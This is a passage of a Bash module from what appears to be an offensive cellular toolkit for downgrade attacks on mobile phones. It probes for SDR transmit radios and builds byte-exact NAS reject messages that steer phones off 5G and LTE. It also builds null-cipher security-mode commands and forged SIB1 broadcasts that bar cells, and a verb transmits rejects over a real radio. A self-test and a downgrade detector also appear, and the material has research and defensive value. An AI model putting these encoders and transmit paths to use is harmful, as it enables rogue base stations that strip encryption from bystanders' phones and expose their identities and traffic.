    printf 'name\t%s\n'   "$name"
    printf 'status\thandoff\n'
    printf 'testbed\t%s\n' "$(dwn_sanitize "$need")"
}

# ── hardware guards ─────────────────────────────────────────────────────
# A driver binary on PATH is not a radio. `command -v hackrf_transfer` is true
# on any box with the HackRF tools installed, with or without a HackRF plugged
# in, so deciding a transmit radio exists that way makes this module announce a
# radio it cannot transmit through. Each driver is asked instead, and only its
# answer counts (the same probe shape modules/10_lte_air.sh:3296 uses):
#   * hackrf_info exits non-zero and says "No HackRF boards found." with no
#     board attached;
#   * bladeRF-cli -p exits non-zero with "No devices are available.";
#   * LimeUtil --find exits 0 with AND without a device, so its OUTPUT is the
#     only signal -- no information at all means no radio;
#   * uhd_find_devices prints a "Device Address" block per device.
# SoapySDRUtil is not used: it reports "Found device 0" with nothing attached.
dwn_sdr_probe() {
    local drv="$1" out
    case "$drv" in
        hackrf)
            command -v hackrf_info >/dev/null 2>&1 || return 1
            out=$(timeout 10 hackrf_info 2>&1) || return 1
            grep -qi 'no hackrf boards found' <<< "$out" && return 1
            return 0 ;;
        bladerf)
            command -v bladeRF-cli >/dev/null 2>&1 || return 1
            out=$(timeout 10 bladeRF-cli -p 2>&1) || return 1
            grep -qi 'no devices are available' <<< "$out" && return 1
            return 0 ;;
        limesdr)
            command -v LimeUtil >/dev/null 2>&1 || return 1
            out=$(timeout 15 LimeUtil --find 2>&1)
            [[ -n "${out//[[:space:]]/}" ]] ;;
        usrp|b200|b210)
            command -v uhd_find_devices >/dev/null 2>&1 || return 1
            out=$(timeout 15 uhd_find_devices 2>&1)
            grep -qi 'device address' <<< "$out" ;;
        *) return 1 ;;
    esac
}

# dwn_find_tx_sdr: the transmit radio, or non-zero when there is none.
dwn_find_tx_sdr() {
    local f drv
    # Defined but empty is an instruction, not an unset variable: the selftest
    # uses it to prove the refusal path on a box that HAS a radio.
    if [[ -n "${DWN_SDR_DEVICE+set}" ]]; then
        [[ -n "$DWN_SDR_DEVICE" ]] || return 1
        printf '%s\n' "$DWN_SDR_DEVICE"; return 0
    fi
    for f in "$DWN_SDR" "$TMP_DIR/sdr_device"; do
        [[ -s "$f" ]] || continue
        drv=$(cut -f1 < "$f" 2>/dev/null | head -n1 | tr -d '\r')
        [[ -n "$drv" ]] && { printf '%s\n' "$drv"; return 0; }
    done
    for drv in hackrf bladerf limesdr usrp b200 b210; do
        dwn_sdr_probe "$drv" && { printf '%s\n' "$drv"; return 0; }
    done
    return 1
}

dwn_find_gsm_stack() {
    local t
    for t in grgsm_scanner osmocon; do
        command -v "$t" >/dev/null 2>&1 && { echo "$t"; return 0; }
    done
    return 1
}

dwn_find_capture_tool() {
    command -v tshark  >/dev/null 2>&1 && { echo "tshark";  return 0; }
    command -v tcpdump >/dev/null 2>&1 && { echo "tcpdump"; return 0; }
    return 1
}

dwn_status() {
    local tx stack cap
    tx=$(dwn_find_tx_sdr)        || tx="missing"
    stack=$(dwn_find_gsm_stack)  || stack="missing"
    cap=$(dwn_find_capture_tool) || cap="missing"
    printf 'tx_sdr\t%s\n'     "$tx"
    printf 'legacy_stack\t%s\n' "$stack"
    printf 'capture\t%s\n'    "$cap"
    printf 'causes\t%s\n'     "$(dwn_causes | grep -vc '^#')"
    printf 'null_ciphers\t%s\n' "$(dwn_null_ciphers | grep -vc '^#')"
    printf 'plans\t%s\n'      "$(ls -1 "$DWN_PLAN_DIR"/*.plan 2>/dev/null | wc -l)"
    printf 'dir\t%s\n'        "$DWN_DIR"
    printf 'plan_dir\t%s\n'   "$DWN_PLAN_DIR"
}

# ── CLI verbs ───────────────────────────────────────────────────────────
dwn_cli_status_tsv() { dwn_status; }

dwn_cmd_reject_cause() {
    local n="${1:-}" rat="${2:-}"
    [[ -n "$n" ]] || { printf 'ERROR\tusage: --reject-cause <n> [EMM|5GMM|GMM]\n' >&2; return 2; }
    [[ "$n" =~ ^[0-9]+$ ]] || {
        printf 'ERROR\tcause must be numeric: %s\n' "$(dwn_sanitize "$n")" >&2; return 2; }
    if [[ -n "$rat" ]]; then
        dwn_reject_encoding "${rat^^}" "$n"
        return $?
    fi
    # No RAT given: report the cause in every generation that defines it.
    local found=0
    local r
    for r in 5GMM EMM GMM; do
        if dwn_cause_row "$r" "$n" >/dev/null && [[ -n "$(dwn_cause_row "$r" "$n")" ]]; then
            dwn_reject_encoding "$r" "$n"
            found=$(( found + 1 ))
            printf 'separator\t---\n'
        fi
    done
    if (( found == 0 )); then
        printf 'ERROR\tcause %s is not an assigned reject cause in 5GMM, EMM or GMM\n' \
            "$(dwn_sanitize "$n")" >&2
        return 1
    fi
}

dwn_cmd_null_table() { dwn_null_table; }

dwn_cmd_build_smc() {
    local alg="${1:-}" a2="${2:-}" a3="${3:-}"
    [[ -n "$alg" ]] || { printf 'ERROR\tusage: --build-security-mode <cipher-alg> [integrity-alg] [NR|LTE|UMTS|GSM]\n' >&2; return 2; }
    dwn_build_security_mode "$alg" "$a2" "$a3"
}

dwn_cmd_detect() { dwn_detect "${1:-}"; }

# The NAS reject message itself: header, message type and the mandatory cause
# IE, for one RAT and message class.
dwn_cmd_build_reject() {
    local rat="${1:-}" cause="${2:-}" kind="${3:-attach}"
    [[ -n "$rat" && -n "$cause" ]] || {
        printf 'ERROR\tusage: --build-reject <EMM|5GMM|GMM> <cause> [attach|tau|service]\n' >&2
        return 2; }
    case "${rat^^}" in
        EMM|5GMM|GMM) ;;
        *) printf 'ERROR\trat must be EMM, 5GMM or GMM: %s\n' "$(dwn_sanitize "$rat")" >&2
           return 2 ;;
    esac
    [[ "$cause" =~ ^[0-9]+$ ]] || {
        printf 'ERROR\tcause must be numeric: %s\n' "$(dwn_sanitize "$cause")" >&2; return 2; }
    dwn_nas_reject_build "${rat^^}" "$cause" "$kind" || {
        printf 'ERROR\tno %s reject carries cause %s as a %s reject\n' \
               "$(dwn_sanitize "${rat^^}")" "$(dwn_sanitize "$cause")" \
               "$(dwn_sanitize "$kind")" >&2
        return 1; }
}

# The same message over the real downlink chain, and an honest answer about
# whether a radio exists to carry it.
dwn_cmd_tx_reject() {
    local rat="${1:-}" cause="${2:-}" kind="${3:-attach}"
    if [[ -z "$rat" ]]; then
        printf 'ERROR\tusage: --tx-reject <EMM|5GMM|GMM> <cause> [attach|tau|service]\n' >&2
        return 2
    fi
    case "${rat^^}" in
        EMM|5GMM|GMM) ;;
        *) printf 'ERROR\trat must be EMM, 5GMM or GMM: %s\n' "$(dwn_sanitize "$rat")" >&2
           return 2 ;;
    esac
    [[ "$cause" =~ ^[0-9]+$ ]] || {
        printf 'ERROR\tcause must be numeric: %s\n' "$(dwn_sanitize "$cause")" >&2; return 2; }
    dwn_tx_reject "${rat^^}" "$cause" "$kind"
}

dwn_cmd_plan() {
    local name="${1:-}"
    [[ -n "$name" ]] || {
        printf 'ERROR\tusage: --plan <steer-down|jamming-suppress|cs-fallback|forged-sib|sni5gect|eps-fallback|nr-utran-redirect>\n' >&2; return 2; }
    dwn_plan "$name"
}

dwn_cmd_path() {
    local name="${1:-}"
    [[ -n "$name" ]] || {
        printf 'ERROR\tusage: --path <steer-down|jamming-suppress|cs-fallback|forged-sib|sni5gect>\n' >&2; return 2; }
    dwn_path "$name"
}

# ── selftest — no radio, no root, no network ────────────────────────────
dwn_selftest() {
    local bad=0
    chk() {
        local n="$1" got="$2" want="$3"
        if [[ "$got" == "$want" ]]; then printf '%s\tPASS\n' "$n"
        else printf '%s\tFAIL want=%s got=%s\n' "$n" "$want" "$got"; bad=$(( bad + 1 )); fi
    }
    fld() { printf '%s\n' "$1" | awk -F'\t' -v k="$2" '$1==k{print $2; exit}'; }

    # Steering of Roaming, the network half. The encoder has to agree with the
    # decoder in 16_sim, so the round-trip is asserted here rather than
    # trusting either side alone.
    chk steer-plmn-208-01  "$(dwn_plmn_bcd 208 01)" "0208F1"
    chk steer-plmn-260-001 "$(dwn_plmn_bcd 260 001)" "620010"
    chk steer-plmn-310-410 "$(dwn_plmn_bcd 310 410)" "134001"
    # MCC 208 MNC 01 is 02 08 F1, NOT 20 80 10 — the low nibble goes first.
    chk steer-plmn-not-swapped "$([ "$(dwn_plmn_bcd 208 01)" != "208001" ] && echo yes)" "yes"
    chk steer-eplmn-ie "$(dwn_build_eplmn '208-01,208-02,310-410' 2>/dev/null)" "090208F10208F2134001"
    chk steer-eplmn-len "$(dwn_build_eplmn '208-01' 2>/dev/null | cut -c1-2)" "03"
    # An EPLMN IE holds 15 entries; the sixteenth is a second message, not a
    # truncated first one.
    local too_many many
    many=$(python3 -c 'print(",".join("208-%02d" % i for i in range(1,17)))')
    too_many=$(dwn_build_eplmn "$many" 2>&1 >/dev/null | grep -c 'at most 15')
    chk steer-eplmn-limit "$too_many" "1"
    chk steer-plmn-bad "$(dwn_plmn_bcd 208 1 2>&1 >/dev/null | grep -c 'two or three digits')" "1"

    local d out rc
    d=$(mktemp -d "$MOD_TMP/selftest.XXXXXX") || {
        printf 'ERROR\tmktemp failed under %s\n' "$MOD_TMP" >&2; return 1; }
    export LOOT_DIR="$d/loot" CAPTURES_DIR="$d/captures" STATE_DIR="$d/state"
    export TMP_DIR="$d/tmp" DWN_DIR="$d/loot/downgrade" DWN_PLAN_DIR="$d/loot/downgrade/plans"
    mkdir -p "$DWN_DIR" "$DWN_PLAN_DIR"

    # 1. Reject-cause lookup for the real assigned values.
    #    EMM (TS 24.301 9.9.3.9): 15 no suitable cells, 12 TA not allowed,
    #    13 roaming not allowed, 22 congestion, 7 EPS services not allowed.
    chk emm-15-name "$(dwn_cause_name EMM 15)" "No suitable cells in tracking area"
    chk emm-15-steer "$(dwn_cause_steering EMM 15)" "high"
    chk emm-12-name "$(dwn_cause_name EMM 12)" "Tracking area not allowed"
    chk emm-13-name "$(dwn_cause_name EMM 13)" "Roaming not allowed in this tracking area"
    chk emm-14-name "$(dwn_cause_name EMM 14)" "EPS services not allowed in this PLMN"
    chk emm-22-name "$(dwn_cause_name EMM 22)" "Congestion"
    chk emm-7-name  "$(dwn_cause_name EMM 7)"  "EPS services not allowed"
    chk emm-7-steer "$(dwn_cause_steering EMM 7)" "high"
    #    5GMM (TS 24.501 9.11.3.2): 27 N1 mode not allowed, 31 redirection to
    #    EPC required, 15 no suitable cells, 11 PLMN not allowed.
    chk gmm-27-name "$(dwn_cause_name 5GMM 27)" "N1 mode not allowed"
    chk gmm-27-steer "$(dwn_cause_steering 5GMM 27)" "high"
    chk gmm-31-name "$(dwn_cause_name 5GMM 31)" "Redirection to EPC required"
    chk gmm-15-name "$(dwn_cause_name 5GMM 15)" "No suitable cells in tracking area"
    chk gmm-11-name "$(dwn_cause_name 5GMM 11)" "PLMN not allowed"
    chk gmm-22-name "$(dwn_cause_name 5GMM 22)" "Congestion"
    chk gmm-72-name "$(dwn_cause_name 5GMM 72)" "Non-3GPP access to 5GCN not allowed"
    #    GMM (TS 24.008 10.5.5.14).
    chk gmm2-6-name "$(dwn_cause_name GMM 6)" "GPRS services not allowed"
    chk gmm2-13-name "$(dwn_cause_name GMM 13)" "Roaming not allowed in this location area"
    #    An unknown cause must be reported as unknown, never guessed.
    chk cause-unknown-rc "$(dwn_cmd_reject_cause 250 >/dev/null 2>&1; echo $?)" "1"
    chk cause-unknown-name "$(dwn_cause_name EMM 250)" ""
    chk cause-nonnum "$(dwn_cmd_reject_cause abc >/dev/null 2>&1; echo $?)" "2"
    chk cause-noargs "$(dwn_cmd_reject_cause >/dev/null 2>&1; echo $?)" "2"
    #    A cause that exists in one generation but not another.
    chk cause-27-emm "$(dwn_cause_row EMM 27)" ""
    chk cause-27-5gmm "$(dwn_cause_name 5GMM 27)" "N1 mode not allowed"

    # 2. The reject encoding: the cause IE and the octets it puts on the wire.
    #    The tag (EMM 0x53 / 5GMM 0x59 / GMM 0x13) identifies the IE in a
    #    TLV, but this cause is a MANDATORY type-3 IE in a reject, so the tag
    #    is not transmitted and the octet after the message type IS the cause.
    #    pycrate encodes 07440F for Attach reject cause 15 and Wireshark reads
    #    07440F back as Attach reject (EMM cause 15); 0744530F is neither.
    out=$(dwn_reject_encoding 5GMM 27)
    chk rej-rat     "$(fld "$out" rat)"        "5GMM"
    chk rej-cause   "$(fld "$out" cause)"      "27"
    chk rej-hex     "$(fld "$out" cause_hex)"  "1B"
    chk rej-ie      "$(fld "$out" cause_ie)"   "0x59"
    chk rej-ie-wire "$(fld "$out" cause_ie_on_wire)" "no"
    chk rej-octets  "$(fld "$out" wire_octets)" "1B"
    chk rej-name    "$(fld "$out" name)"       "N1 mode not allowed"
    out=$(dwn_reject_encoding EMM 15)
    chk rej-emm-ie  "$(fld "$out" cause_ie)"   "0x53"
    chk rej-emm-hex "$(fld "$out" cause_hex)"  "0F"
    chk rej-emm-oct "$(fld "$out" wire_octets)" "0F"
    chk rej-emm-name "$(fld "$out" name)"      "No suitable cells in tracking area"
    out=$(dwn_reject_encoding GMM 12)
    chk rej-gmm-ie  "$(fld "$out" cause_ie)"   "0x13"
    chk rej-gmm-hex "$(fld "$out" cause_hex)"  "0C"
    chk rej-gmm-oct "$(fld "$out" wire_octets)" "0C"
    chk rej-bad-rat "$(dwn_reject_encoding XYZ 1 >/dev/null 2>&1; echo $?)" "1"

    # 3. Null-cipher table completeness across all four generations.
    local tbl; tbl=$(dwn_null_table)
    chk null-hdr "$(printf '%s\n' "$tbl" | head -1)" "rat	alg	cipher	integrity	bits	exposes"
    # NR and LTE each define 4 algorithms (NEA/EEA 0..3); UMTS defines 3
    # (UEA 0..2 per TS 33.102 §6.6); GSM has A5/0 through A5/3.
    chk null-NR-count   "$(printf '%s\n' "$tbl" | awk -F'\t' '$1=="NR"'   | grep -c .)" "4"
    chk null-LTE-count  "$(printf '%s\n' "$tbl" | awk -F'\t' '$1=="LTE"'  | grep -c .)" "4"
    chk null-UMTS-count "$(printf '%s\n' "$tbl" | awk -F'\t' '$1=="UMTS"' | grep -c .)" "3"
    chk null-GSM-count  "$(printf '%s\n' "$tbl" | awk -F'\t' '$1=="GSM"'  | grep -c .)" "4"
    chk null-total "$(printf '%s\n' "$tbl" | tail -n +2 | grep -c .)" "15"
    #    The null algorithm of each generation, with the real numbers.
    chk null-nea0  "$(printf '%s\n' "$tbl" | awk -F'\t' '$2=="NEA0"{print $1}')" "NR"
    chk null-eea0  "$(printf '%s\n' "$tbl" | awk -F'\t' '$2=="EEA0"{print $1}')" "LTE"
    chk null-uea0  "$(printf '%s\n' "$tbl" | awk -F'\t' '$2=="UEA0"{print $1}')" "UMTS"
    chk null-a50   "$(printf '%s\n' "$tbl" | awk -F'\t' '$2=="A5/0"{print $1}')"  "GSM"
    chk null-a50-bits "$(printf '%s\n' "$tbl" | awk -F'\t' '$2=="A5/0"{print $5}')" "0"
    chk null-exposes "$(printf '%s\n' "$tbl" | awk -F'\t' '$2=="NEA0"{print $6}')" \
        "no confidentiality and no integrity on NAS and AS"
    # Each generation has exactly one "no ciphering" entry. GSM spells it
    # "no ciphering" rather than "null", so match the real row names.
    chk null-NR-detect   "$(dwn_null_for_rat NR   | grep -c 'NEA0')" "1"
    chk null-LTE-detect  "$(dwn_null_for_rat LTE  | grep -c 'EEA0')" "1"
    chk null-UMTS-detect "$(dwn_null_for_rat UMTS | grep -c 'UEA0')" "1"
    chk null-GSM-detect  "$(dwn_null_for_rat GSM  | grep -c 'A5/0')" "1"
    chk null-GSM-clear   "$(dwn_null_for_rat GSM  | grep -c 'in the clear')" "1"
    chk null-is-null-nea0 "$(dwn_is_null_alg NEA0 && echo yes || echo no)" "yes"
    chk null-is-null-eea0 "$(dwn_is_null_alg EEA0 && echo yes || echo no)" "yes"
    chk null-is-null-a50  "$(dwn_is_null_alg A5/0 && echo yes || echo no)" "yes"
    chk null-is-null-a51  "$(dwn_is_null_alg A5/1 && echo echo || echo no)" "no"
    chk null-is-null-nea2 "$(dwn_is_null_alg NEA2 && echo yes || echo no)" "no"

    # 4. Security-mode encoding, byte-exact.
    #    The octet is cipher_id (bits 8-5) | integrity_id (bits 4-1).
    #    NEA0/NIA0 -> 00, NEA2/NIA2 -> 22, EEA1/EIA1 -> 11, A5/1 -> 10.
    out=$(dwn_build_security_mode NEA0)
    chk smc-nea0-octet "$(fld "$out" smc_octet)" "00"
    chk smc-nea0-null  "$(fld "$out" null_algorithm)" "yes"
    chk smc-nea0-bits  "$(fld "$out" smc_bits)" "00000000"
    out=$(dwn_build_security_mode NEA2)
    chk smc-nea2-octet "$(fld "$out" smc_octet)" "22"
    chk smc-nea2-null  "$(fld "$out" null_algorithm)" "no"
    out=$(dwn_build_security_mode EEA1 LTE)
    chk smc-eea1-octet "$(fld "$out" smc_octet)" "11"
    chk smc-eea1-ciph  "$(fld "$out" cipher_id)"  "1"
    out=$(dwn_build_security_mode EEA0 LTE)
    chk smc-eea0-octet "$(fld "$out" smc_octet)" "00"
    chk smc-eea0-null  "$(fld "$out" null_algorithm)" "yes"
    out=$(dwn_build_security_mode UEA0 UMTS)
    chk smc-uea0-octet "$(fld "$out" smc_octet)" "00"
    out=$(dwn_build_security_mode UEA1 UMTS)
    chk smc-uea1-octet "$(fld "$out" smc_octet)" "11"
    #    A5/1 has no integrity algorithm, so the low nibble is zero.
    out=$(dwn_build_security_mode A5/1 GSM)
    chk smc-a51-octet  "$(fld "$out" smc_octet)" "10"
    chk smc-a51-integ  "$(fld "$out" integrity_id)" "0"
    chk smc-a51-nointeg "$(printf '%s\n' "$out" | grep -c 'integrity_available')" "1"
    out=$(dwn_build_security_mode A5/0 GSM)
    chk smc-a50-octet  "$(fld "$out" smc_octet)" "00"
    chk smc-a50-null   "$(fld "$out" null_algorithm)" "yes"
    chk smc-bad-alg    "$(dwn_build_security_mode WAT >/dev/null 2>&1; echo $?)" "2"
    chk smc-noargs     "$(dwn_build_security_mode >/dev/null 2>&1; echo $?)"     "2"
    #    The ciphering nibble must be the high one: a swap would still produce
    #    a plausible-looking octet, so pin the asymmetric case.
    out=$(dwn_build_security_mode NEA3)
    chk smc-nea3-octet "$(fld "$out" smc_octet)" "33"

    # 5. Downgrade detection against a synthetic record with all three
    #    signatures present.
    local cap="$d/capture.tsv"
    dwn_sample_capture > "$cap"
    out=$(dwn_detect "$cap")
    chk det-records  "$(fld "$out" records)"          "7"
    chk det-steers   "$(fld "$out" steering_rejects)" "1"
    chk det-rats     "$(fld "$out" rat_changes)"      "1"
    chk det-null     "$(fld "$out" null_ciphers)"     "1"
    chk det-findings "$(fld "$out" findings)"         "3"
    chk det-verdict  "$(fld "$out" verdict)"          "DOWNGRADE"
    chk det-f-steer  "$(printf '%s\n' "$out" | grep -c '^finding	steering-reject')" "1"
    chk det-f-rat    "$(printf '%s\n' "$out" | grep -c '^finding	rat-downgrade')"   "1"
    chk det-f-null   "$(printf '%s\n' "$out" | grep -c '^finding	null-cipher')"     "1"
    chk det-rats-seen "$(fld "$out" rats_seen)" "LTE NR "
    #    A clean capture: a normal 5G registration with a strong cipher.
    cat > "$cap" <<'EOF'
1	NR	attach	Registration Request imsi=208011234567890
2	NR	accept	Registration Accept
3	NR	cipher	cipher=NEA2 integrity=NIA2
4	NR	measurement	rsrp=-88 gscn=7915
EOF
    out=$(dwn_detect "$cap")
    chk clean-verdict "$(fld "$out" verdict)"   "CLEAN"
    chk clean-find    "$(fld "$out" findings)"  "0"
    chk clean-steers  "$(fld "$out" steering_rejects)" "0"
    #    A lone reject with no RAT change is SUSPECT, not DOWNGRADE.
    cat > "$cap" <<'EOF'
1	NR	reject	Registration Reject cause=15 name=No suitable cells in tracking area
2	NR	accept	Registration Accept
EOF
    out=$(dwn_detect "$cap")
    chk suspect-verdict "$(fld "$out" verdict)"  "SUSPECT"
    chk suspect-find    "$(fld "$out" findings)" "1"
    #    A non-steering reject must not be flagged.
    cat > "$cap" <<'EOF'
1	NR	reject	Registration Reject cause=22 name=Congestion
EOF
    out=$(dwn_detect "$cap")
    chk nonsteer-verdict "$(fld "$out" verdict)"  "CLEAN"
    chk nonsteer-steers  "$(fld "$out" steering_rejects)" "0"
    chk detect-missing "$(dwn_detect /nonexistent.tsv >/dev/null 2>&1; echo $?)" "1"
    chk detect-noargs  "$(dwn_detect >/dev/null 2>&1; echo $?)" "2"
    : > "$d/empty.tsv"
    chk detect-empty   "$(dwn_detect "$d/empty.tsv" >/dev/null 2>&1; echo $?)" "1"

    # 6. The four paths each describe a real mechanism.
    local p
    for p in steer-down jamming-suppress cs-fallback forged-sib sni5gect; do
        out=$(dwn_path "$p")
        chk "path-$p-name"    "$(fld "$out" path)"   "$p"
        chk "path-$p-mech"    "$(printf '%s\n' "$out" | grep -c '^mechanism	')"  "1"
        chk "path-$p-ue"      "$(printf '%s\n' "$out" | grep -c '^ue_behaviour	')" "1"
        chk "path-$p-detect"  "$(printf '%s\n' "$out" | grep -c '^detect_by	')" "1"
    done
    chk path-steer-cause "$(dwn_path steer-down | grep -c 'N1 mode not allowed')" "1"
    chk path-cs-imsi     "$(dwn_path cs-fallback | grep -c 'imsi_exposure')"     "1"
    chk path-bad         "$(dwn_path nonsense >/dev/null 2>&1; echo $?)" "2"

    # 7. Plan files carry status: handoff and name the hardware.
    for p in steer-down jamming-suppress cs-fallback forged-sib sni5gect; do
        out=$(dwn_plan "$p")
        chk "plan-$p-status"  "$(fld "$out" status)" "handoff"
        chk "plan-$p-file"    "$([[ -f "$DWN_PLAN_DIR/${p}.plan" ]] && echo yes || echo no)" "yes"
        chk "plan-$p-field"   "$(grep -c '^status: handoff$' "$DWN_PLAN_DIR/${p}.plan")" "1"
        chk "plan-$p-testbed" "$(grep -c '^testbed_required:' "$DWN_PLAN_DIR/${p}.plan")" "1"
        chk "plan-$p-steps"   "$(grep -c '^steps:' "$DWN_PLAN_DIR/${p}.plan")" "1"
        chk "plan-$p-nonempty" "$(awk '/^testbed_required:/{getline; if (length($0)>10) print "yes"; exit}' \
                                   "$DWN_PLAN_DIR/${p}.plan")" "yes"
    done
    chk plan-jam-radio "$(grep -c 'HackRF\|BladeRF\|USRP\|LimeSDR' "$DWN_PLAN_DIR/jamming-suppress.plan")" "1"
    chk plan-bad  "$(dwn_plan nonsense >/dev/null 2>&1; echo $?)" "2"
    chk plan-none "$(dwn_plan '' >/dev/null 2>&1; echo $?)"       "2"

    # 8. --build-sib1 encodes cellBarred. The body layout is the tree's own
    #    SIB1 convention, sliced exactly as 10_lte_air --decode-sib 1 reads it:
    #    PLMN 0:6 | TAC 6:2 + 8:2 | cellIdentity 10:7.
    chk sib1-plmn-2digit "$(dwn_encode_plmn 234 15)"  "32f451"
    chk sib1-plmn-3digit "$(dwn_encode_plmn 310 260)" "130062"
    local sib sib_body
    sib=$(dwn_build_sib1 234 15 4444 1234567 barred notAllowed)
    chk sib1-body    "$(fld "$sib" body)"        "32f451115c012d687"
    chk sib1-nibbles "$(fld "$sib" nibbles)"     "19"
    chk sib1-flags   "$(fld "$sib" flags_octet)" "c0"
    chk sib1-barred  "$(fld "$sib" cell_barred)" "barred"
    chk sib1-intra   "$(fld "$sib" intra_freq_reselection)" "notAllowed"
    sib_body=$(fld "$sib" body)
    chk sib1-slice-plmn   "${sib_body:0:6}" "$(dwn_encode_plmn 234 15)"
    chk sib1-slice-tac    "$(( 16#${sib_body:6:2} * 256 + 16#${sib_body:8:2} ))" "4444"
    chk sib1-slice-cellid "$(( 16#${sib_body:10:7} ))" "1234567"
    chk sib1-notbarred "$(fld "$(dwn_build_sib1 234 15 4444 1234567 notBarred allowed)" flags_octet)" "00"
    # A built SIB1 must say it is not TS 36.331 APER rather than imply it is.
    chk sib1-honest-encoding "$(printf '%s\n' "$sib" | grep -c 'NOT TS 36.331 APER')" "1"
    # Bad input must fail, never guess.
    chk sib1-bad-plmn   "$(dwn_build_sib1 12 15 >/dev/null 2>&1; echo $?)"          "1"
    chk sib1-bad-tac    "$(dwn_build_sib1 234 15 70000 0 >/dev/null 2>&1; echo $?)" "1"
    chk sib1-bad-cellid "$(dwn_build_sib1 234 15 1 268435456 >/dev/null 2>&1; echo $?)" "1"
    chk sib1-bad-barred "$(dwn_build_sib1 234 15 1 0 maybe >/dev/null 2>&1; echo $?)"   "1"
    chk sib1-bad-intra  "$(dwn_build_sib1 234 15 1 0 barred maybe >/dev/null 2>&1; echo $?)" "1"

    # 9. Verb validation returns non-zero and never prints a success line.
    chk cli-cause-noargs  "$(dwn_cmd_reject_cause >/dev/null 2>&1; echo $?)" "2"
    chk cli-cause-bad     "$(dwn_cmd_reject_cause xyz >/dev/null 2>&1; echo $?)" "2"
    chk cli-cause-unassigned "$(dwn_cmd_reject_cause 251 >/dev/null 2>&1; echo $?)" "1"
    chk cli-smc-noargs    "$(dwn_cmd_build_smc >/dev/null 2>&1; echo $?)" "2"
    chk cli-smc-bad       "$(dwn_cmd_build_smc NOPE >/dev/null 2>&1; echo $?)" "2"
    chk cli-detect-noargs "$(dwn_cmd_detect >/dev/null 2>&1; echo $?)" "2"
    chk cli-plan-bad      "$(dwn_cmd_plan nope >/dev/null 2>&1; echo $?)" "2"
    chk cli-sib1-bad-plmn "$(dwn_cli_main --build-sib1 12 15 >/dev/null 2>&1; echo $?)" "1"
    # The forged-sib plan must point at the real offline encoder, not stand alone.
    chk plan-forged-sib-encoder   "$(grep -c 'build-sib1' "$DWN_PLAN_DIR/forged-sib.plan" | awk '{print ($1>=1)?"yes":"no"}')" "yes"
    chk plan-forged-sib-cellbarred "$(grep -c 'cellBarred' "$DWN_PLAN_DIR/forged-sib.plan" | awk '{print ($1>=1)?"yes":"no"}')" "yes"
    chk cli-unknown       "$(dwn_cli_main --wat >/dev/null 2>&1; echo $?)" "2"

    # 10. Status TSV contract: the tables are always present.
    out=$(dwn_cli_status_tsv)
    chk status-dir      "$(fld "$out" dir)"      "$DWN_DIR"
    chk status-plandir  "$(fld "$out" plan_dir)" "$DWN_PLAN_DIR"
    chk status-causes   "$(fld "$out" causes | awk '{print ($1>=40)?"ok":"short"}')" "ok"
    chk status-nulls    "$(fld "$out" null_ciphers)" "15"
    chk status-keys     "$(printf '%s\n' "$out" | grep -c . | awk '{print ($1>=8)?"ok":"short"}')" "ok"

    # 11. TSV injection: a tab in an untrusted string must not forge a row.
    local evil
    evil=$(dwn_sanitize $'NR\tfake\trow\nmore')
    chk sanitize-tabs "$(printf '%s' "$evil" | awk -F'\t' '{print NF}')" "1"
    chk sanitize-nl   "$(printf '%s' "$evil" | grep -c .)" "1"

    # 12. pcap classification. A capture whose protocol info names a reject cause
    #     must actually raise the steering-reject signal. Guards the awk that turns
    #     tshark rows into records: it used to write a literal "event" into the
    #     event column, so all three detectors -- which key on that column -- could
    #     never fire and --detect answered CLEAN for every capture.
    if command -v tshark >/dev/null 2>&1 && command -v text2pcap >/dev/null 2>&1; then
        local hp="$d/reject.pcap"
        printf '0000 47 45 54 20 2f 72 65 6a 65 63 74 3f 63 61 75 73\n0010 65 3d 31 35 20 48 54 54 50 2f 31 2e 31 0d 0a\n' > "$d/hex.txt"
        if text2pcap -q -T 12345,80 "$d/hex.txt" "$hp" >/dev/null 2>&1; then
            out=$(bash "$0" --detect "$hp" 2>/dev/null)
            chk pcap-reject-raised "$(printf '%s\n' "$out" | awk -F'\t' '$1=="steering_rejects"{print $2}')" "1"
            chk pcap-verdict       "$(printf '%s\n' "$out" | awk -F'\t' '$1=="verdict"{print $2}')" "SUSPECT"
        else
            chk pcap-reject-raised "text2pcap-failed" "ok-or-skipped"
        fi
    else
        printf 'pcap-reject-raised\tSKIP (no tshark/text2pcap)\n'
    fi

    # 13. The NAS reject MESSAGE, not just its cause octet: security header
    #     type / skip indicator, protocol discriminator, message type and the
    #     mandatory cause IE, assembled per generation. The hex asserted here
    #     is the published wire form -- TS 24.301 Table 9.8.1 with 9.9.3.9,
    #     TS 24.501 9.7 with 9.11.3.2, TS 24.008 Table 10.4 with 10.5.5.14 --
    #     and group 14 has pycrate parse and re-encode every one of them.
    out=$(dwn_nas_reject_build EMM 15 attach)
    chk msg-emm-attach-hex  "$(fld "$out" msg_hex)"        "07440F"
    chk msg-emm-attach-type "$(fld "$out" msg_type_hex)"   "44"
    chk msg-emm-hdr-octets  "$(fld "$out" hdr_octets)"     "2"
    chk msg-emm-octets      "$(fld "$out" msg_octets)"     "3"
    chk msg-emm-bits        "$(fld "$out" msg_bits)"       "24"
    # A mandatory type-3 IE transmits no identifier: sending 0x53 there, which
    # the old cause_ie row used to advertise, makes the message unparseable.
    chk msg-ie-on-wire      "$(fld "$out" cause_ie_on_wire)" "no"
    chk msg-ie-wire-octet   "$(fld "$out" cause_wire_octet)" "0F"
    out=$(dwn_nas_reject_build EMM 22 tau)
    chk msg-emm-tau-hex     "$(fld "$out" msg_hex)"        "074B16"
    chk msg-emm-tau-type    "$(fld "$out" msg_type_hex)"   "4B"
    out=$(dwn_nas_reject_build EMM 15 service)
    chk msg-emm-svc-hex     "$(fld "$out" msg_hex)"        "074E0F"
    chk msg-emm-svc-type    "$(fld "$out" msg_type_hex)"   "4E"
    # 5GS keeps the discriminator in its own octet, so the header is three
    # octets and there is a spare half octet beside the security header type.
    out=$(dwn_nas_reject_build 5GMM 27 attach)
    chk msg-5gmm-reg-hex    "$(fld "$out" msg_hex)"        "7E00441B"
    chk msg-5gmm-type       "$(fld "$out" msg_type_hex)"   "44"
    chk msg-5gmm-hdr-octets "$(fld "$out" hdr_octets)"     "3"
    chk msg-5gmm-octets     "$(fld "$out" msg_octets)"     "4"
    chk msg-5gmm-bits       "$(fld "$out" msg_bits)"       "32"
    out=$(dwn_nas_reject_build 5GMM 31 tau)
    chk msg-5gmm-tau-hex    "$(fld "$out" msg_hex)"        "7E00441F"
    chk msg-5gmm-tau-type   "$(fld "$out" msg_type_hex)"   "44"
    out=$(dwn_nas_reject_build 5GMM 27 service)
